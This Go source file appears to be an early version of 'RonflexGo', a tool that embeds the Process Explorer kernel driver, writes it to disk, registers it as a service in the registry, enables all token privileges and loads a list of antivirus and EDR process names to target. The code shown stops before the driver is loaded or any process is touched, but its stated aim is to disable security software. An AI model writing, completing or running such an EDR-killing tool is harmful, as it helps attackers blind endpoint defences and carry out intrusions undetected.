package main

import (
	_ "embed"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/fourcorelabs/wintoken"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//go:embed Resources/Processes.txt
var content_processes string

//go:embed Resources/PROCEXP.sys
var driver []byte

func adjust_privilege() error {
	// thanks to https://github.com/blackhat-go/bhg/blob/7d3318a7a60b7bedc876f8f328ec8e1cbe64c5bc/ch-12/procInjector/winsys/token.go#L55

	current_pid := windows.Getpid()

	token, err := wintoken.OpenProcessToken(current_pid, wintoken.TokenPrimary)
	if err != nil {
		return errors.New("[-] Error while getting current token handle")
	}
	defer token.Close()

	token.EnableAllPrivileges()

	return nil
}

func remove_registry_keys(drivername, driverpath string) error {
	err := registry.DeleteKey(registry.LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"+drivername)
	if err != nil {
		return errors.New("[-] Error while deleting registry key")
	} else {
		return nil
	}
}

func delete_driver(driverpath string) error {
	err := os.Remove(driverpath)
	if err != nil {
		return errors.New("[-] Error while erasing the driver from disk")
	} else {
		return nil
	}
}

func create_registry_keys(drivername, driverpath string) error {
	permission := uint32(registry.QUERY_VALUE | registry.SET_VALUE)
	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"+drivername, permission)
	if err != nil {
		return errors.New("[-] Error while creating registry keys")
	}

	err = key.SetDWordValue("Type", 0)
	if err != nil {
		return errors.New("[-] Error while setting registry key Type")
	}

	err = key.SetDWordValue("ErrorControl", 0)
	if err != nil {
		return errors.New("[-] Error while setting registry key ErrorControl")
	}

	err = key.SetStringValue("ImagePath", driverpath)
	if err != nil {
		return errors.New("[-] Error while setting registry key ImagePath")
	}

	return nil
}

func write_driver(driver []byte) (string, error) {
	binary_name := "PROCEXP"
	f, err := os.Create(binary_name)
	if err != nil {
		return "", errors.New("[-] Error while creating PROCEXP file")
	}
	defer f.Close()

	_, err = f.Write(driver)
	if err != nil {
		return "", errors.New("[-] Error while writing bytes to PROCEXP file")
	}

	current_dir, err := os.Getwd()
	if err != nil {
		return "", errors.New("[-] Error while getting current working directory")
	}
	res := filepath.Join(current_dir, binary_name)

	return res, nil
}

func is_elevated() bool {
	// thanks to https://github.com/redcode-labs/Coldfire/blob/109a68f93162711068a110d8b29cca19061776d0/os_windows.go
	var is_elevated bool

	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		is_elevated = false
	} else {
		is_elevated = true
	}
	return is_elevated
}

func load_process_names(content string) []string {
	var process_list []string
	for _, line := range strings.Split(strings.TrimSuffix(content, "\n"), "\n") {
		process_list = append(process_list, line)
	}
	return process_list
}

func check_args() (string, error) {
	switch len(os.Args) {
	case 1:
		fmt.Println("No argument given, RonflexGo will target all known AV/EDR processes")
		return "", nil
	case 2:
		fmt.Println("Argument provided, RonflexGo will target only", os.Args[1])
		return os.Args[1], nil
	default:
		return "", errors.New("[-] Incorrect number of arguments given")
	}
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func main() {
	const DRIVERNAME string = "ProcExp64"
	//var SE_DEBUG_NAME = [17]uint16{83, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0}

	//fmt.Println("Run this tool as SYSTEM for maximum effect")

	if is_elevated() {
		fmt.Println("[+] Running with elevated rights, getting ready..")
	} else {
		fmt.Println("[-] Not running with elevated rights, exiting..")
		os.Exit(1)
	}

	arg, err := check_args()
	check(err)
	fmt.Println(arg)

	driverpath, err := write_driver(driver)
	check(err)
	fmt.Println("[+] Successfully wrote driver to disk")
	defer delete_driver(driverpath)

	err = create_registry_keys(DRIVERNAME, driverpath)
	check(err)
	fmt.Println("[+] Successfully wrote registry keys")
	defer remove_registry_keys(DRIVERNAME, driverpath)

	err = adjust_privilege()

	//fmt.Println(SE_DEBUG_NAME)
	process_list := load_process_names(content_processes)
	fmt.Println(process_list)
}
